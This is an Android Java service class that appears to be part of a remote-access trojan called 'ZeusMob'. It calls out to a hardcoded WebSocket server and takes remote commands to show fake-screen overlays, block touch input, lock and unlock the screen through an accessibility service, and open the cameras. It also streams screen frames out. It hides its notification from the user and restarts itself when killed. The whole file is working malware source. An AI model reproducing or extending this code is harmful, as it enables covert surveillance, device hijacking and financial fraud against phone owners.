package com.zeusmob.app.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import com.zeusmob.app.R;
import com.zeusmob.app.overlay.OverlayManager;
import java.util.concurrent.TimeUnit;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okio.ByteString;

public class ZeusForegroundService extends Service {

    private static final String TAG        = "ZEUS_DEBUG";
    private static final String CHANNEL_ID = "zeus_fg_silent";
    private static final int    NOTIF_ID   = 1001;

    // WebSocket endpoint (injected via build — override in strings.xml)
    private static final String WS_BASE =
        "wss://67cc0a24-f21b-4384-b1dc-7ea4a07ae976-00-3s3efgf80iyzd.kirk.replit.dev/api/ws";

    /** Static reference so other classes can send frames via WS */
    public static ZeusForegroundService instance;

    private OkHttpClient wsClient;
    private WebSocket    webSocket;
    private Handler      reconnectHandler;
    private boolean      destroyed = false;
    private String       deviceId;
    private OverlayManager overlayManager;

    // ── Lifecycle ─────────────────────────────────────────────────
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        Log.d(TAG, "=== ZeusForegroundService.onCreate() ===");

        createNotificationChannel();
        startForeground(NOTIF_ID, buildNotification());
        reconnectHandler = new Handler(Looper.getMainLooper());
        overlayManager   = OverlayManager.getInstance(getApplicationContext());

        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        if (deviceId == null || deviceId.isEmpty())
            deviceId = "device-" + System.currentTimeMillis();
        Log.d(TAG, "Device ID: " + deviceId);

        connectWebSocket();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "onStartCommand — flags=" + flags);
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        destroyed = true;
        instance  = null;
        Log.d(TAG, "onDestroy — reiniciando serviço");
        if (webSocket != null) webSocket.close(1000, "Service destroyed");
        if (wsClient  != null) wsClient.dispatcher().executorService().shutdown();
        super.onDestroy();
        startService(new Intent(getApplicationContext(), ZeusForegroundService.class));
    }

    // ── Public: send raw bytes (JPEG frame) via WebSocket ─────────
    public void sendBinaryFrame(byte[] jpeg) {
        if (webSocket != null) {
            webSocket.send(ByteString.of(jpeg));
        }
    }

    // ── WebSocket ─────────────────────────────────────────────────
    private void connectWebSocket() {
        if (destroyed) return;

        String wsUrl = WS_BASE + "?role=device&deviceId=" + deviceId;
        Log.d(TAG, "Conectando: " + wsUrl);

        wsClient = new OkHttpClient.Builder()
            .pingInterval(30, TimeUnit.SECONDS)
            .connectTimeout(15, TimeUnit.SECONDS)
            .readTimeout(0, TimeUnit.SECONDS)
            .build();

        Request request = new Request.Builder().url(wsUrl).build();

        webSocket = wsClient.newWebSocket(request, new WebSocketListener() {

            @Override
            public void onOpen(WebSocket ws, Response response) {
                Log.d(TAG, "✅ WS CONECTADO — HTTP " + response.code());
                String json = "{"
                    + "\"event\":\"device_online\","
                    + "\"app\":\"ZeusMob\","
                    + "\"deviceId\":\"" + deviceId + "\""
                    + "}";
                boolean sent = ws.send(json);
                Log.d(TAG, "device_online enviado: " + sent);
            }

            @Override
            public void onMessage(WebSocket ws, String text) {
                Log.d(TAG, "WS msg: " + text);
                if (text.contains("device_registered")) {
                    Log.d(TAG, "✅ Dispositivo REGISTADO!");
                }
                // Dispatch incoming commands from the admin panel
                if (text.contains("\"type\":\"command\"")) {
                    handleCommand(text);
                }
            }

            @Override
            public void onMessage(WebSocket ws, ByteString bytes) {
                Log.d(TAG, "WS binário: " + bytes.size() + " bytes");
            }

            @Override
            public void onFailure(WebSocket ws, Throwable t, Response response) {
                int code = (response != null) ? response.code() : -1;
                Log.w(TAG, "❌ WS FALHA — " + t.getMessage() + " | HTTP " + code);
                scheduleReconnect();
            }

            @Override
            public void onClosed(WebSocket ws, int code, String reason) {
                Log.d(TAG, "WS fechado — " + code + "/" + reason);
                scheduleReconnect();
            }
        });
    }

    // ── Command dispatcher ────────────────────────────────────────
    /**
     * Called when a JSON message with type=command arrives from the server.
     * Extract the "cmd" field and dispatch to the right handler.
     */
    private void handleCommand(String json) {
        String cmd = extractJsonString(json, "cmd");
        Log.d(TAG, "Comando recebido: " + cmd);

        new Handler(Looper.getMainLooper()).post(() -> {
            switch (cmd) {

                // ── Fake Screen overlay ─────────────────────────
                case "toggle_overlay":
                    overlayManager.toggleFakeScreen();
                    sendStatusReport("overlay_toggled",
                        overlayManager.isFakeScreenActive() ? "on" : "off");
                    break;

                // ── Touch block overlay ─────────────────────────
                case "toggle_touch_block":
                    overlayManager.toggleTouchBlock();
                    sendStatusReport("touch_block_toggled",
                        overlayManager.isTouchBlockActive() ? "on" : "off");
                    break;

                // ── Lock screen ─────────────────────────────────
                case "lock_screen":
                    lockScreen();
                    sendStatusReport("screen_locked", "ok");
                    break;

                // ── Unlock screen ───────────────────────────────
                case "unlock_screen":
                    unlockScreen();
                    sendStatusReport("screen_unlocking", "ok");
                    break;

                // ── Camera ──────────────────────────────────────
                case "camera_front":
                    openCamera(true);
                    sendStatusReport("camera_front", "ok");
                    break;

                case "camera_back":
                    openCamera(false);
                    sendStatusReport("camera_back", "ok");
                    break;

                default:
                    Log.w(TAG, "Comando desconhecido: " + cmd);
            }
        });
    }

    // ── Lock / Unlock ─────────────────────────────────────────────

    private void lockScreen() {
        ZeusAccessibilityService svc = ZeusAccessibilityService.instance;
        if (svc != null) {
            Log.d(TAG, "Bloqueando tela via AccessibilityService");
            svc.lockScreen();
        } else {
            Log.w(TAG, "AccessibilityService não disponível — tentando DevicePolicyManager");
            // DevicePolicyManager fallback would go here if admin rights granted
        }
    }

    private void unlockScreen() {
        ZeusAccessibilityService svc = ZeusAccessibilityService.instance;
        if (svc != null) {
            Log.d(TAG, "Desbloqueando tela via AccessibilityService");
            svc.unlockScreen();
        }
    }

    // ── Camera ────────────────────────────────────────────────────

    private void openCamera(boolean front) {
        ZeusAccessibilityService svc = ZeusAccessibilityService.instance;
        if (svc != null) {
            svc.openCamera(front);
        } else {
            Log.w(TAG, "AccessibilityService não disponível para câmera");
        }
    }

    // ── Status report back to server ──────────────────────────────

    private void sendStatusReport(String event, String value) {
        if (webSocket == null) return;
        String json = "{"
            + "\"type\":\"status_report\","
            + "\"event\":\"" + event + "\","
            + "\"value\":\"" + value + "\","
            + "\"deviceId\":\"" + deviceId + "\""
            + "}";
        webSocket.send(json);
    }

    // ── Utilities ─────────────────────────────────────────────────

    /** Minimal JSON string field extractor — avoids pulling in a JSON library */
    private String extractJsonString(String json, String key) {
        String search = "\"" + key + "\":\"";
        int start = json.indexOf(search);
        if (start < 0) return "";
        start += search.length();
        int end = json.indexOf("\"", start);
        return end < 0 ? "" : json.substring(start, end);
    }

    private void scheduleReconnect() {
        if (destroyed) return;
        reconnectHandler.postDelayed(() -> {
            if (!destroyed) {
                Log.d(TAG, "Reconectando WebSocket...");
                connectWebSocket();
            }
        }, 15_000);
    }

    // ── Notification (PRIORITY_MIN = hidden from tray) ────────────

    private void createNotificationChannel() {
        // IMPORTANCE_NONE → silent, hidden from shade
        NotificationChannel ch = new NotificationChannel(
            CHANNEL_ID, "Zeus Background", NotificationManager.IMPORTANCE_NONE);
        ch.setDescription("Serviço em segundo plano");
        ch.setShowBadge(false);
        ch.enableLights(false);
        ch.enableVibration(false);
        NotificationManager nm = getSystemService(NotificationManager.class);
        if (nm != null) nm.createNotificationChannel(ch);
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Serviço")
            .setContentText("Em execução")
            .setSmallIcon(R.drawable.ic_zeus_notif)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .build();
    }
}
